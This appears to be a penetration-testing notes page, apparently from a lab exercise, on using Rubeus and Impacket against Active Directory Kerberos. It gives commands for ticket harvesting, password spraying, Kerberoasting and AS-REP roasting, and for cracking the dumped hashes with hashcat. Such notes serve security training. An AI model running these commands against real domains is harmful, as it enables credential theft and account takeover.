# Rubeus

> Rubeus include many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting, etc.

{% embed url="https://github.com/GhostPack/Rubeus" %}

## Harvesting Tickets

_For pass the ticket attack_

`cd Downloads` - navigate to the directory Rubeus is in

`Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for TGTs every 30 seconds

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Brute-Forcing / Password-Spraying

In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command:

`echo MACHINE_IP CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

`cd Downloads` - navigate to the directory Rubeus is in

`Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt="" width="523"><figcaption></figcaption></figure>

## Kerberoasting

### Rubeus

`cd Downloads` - navigate to the directory Rubeus is in

`Rubeus.exe kerberoast` This will dump the Kerberos hash of any kerberoastable users

copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat

`hashcat -m 13100 -a 0 hash.txt wordlist.txt` - now crack that hash

<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

### Impacket

**Impacket Installation**

`cd /opt` navigate to your preferred directory to save tools in

download the precompiled package from https://github.com/SecureAuthCorp/impacket/releases/tag/impacket\_0\_9\_19

`cd Impacket-0.9.19` navigate to the impacket directory

`pip install .` - this will install all needed dependencies

**Kerberoasting w/ Impacket**

`cd /usr/share/doc/python3-impacket/examples/` - navigate to where GetUserSPNs.py is located

`sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request` - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

`hashcat -m 13100 -a 0 hash.txt wordlist.txt` - now crack that hash

## AS-REP Roasting

AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

### Dumping KRBASREP5 hashes

`cd Downloads` - navigate to the directory Rubeus is in

`Rubeus.exe asreproast` - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.

Crack hash with hashcat
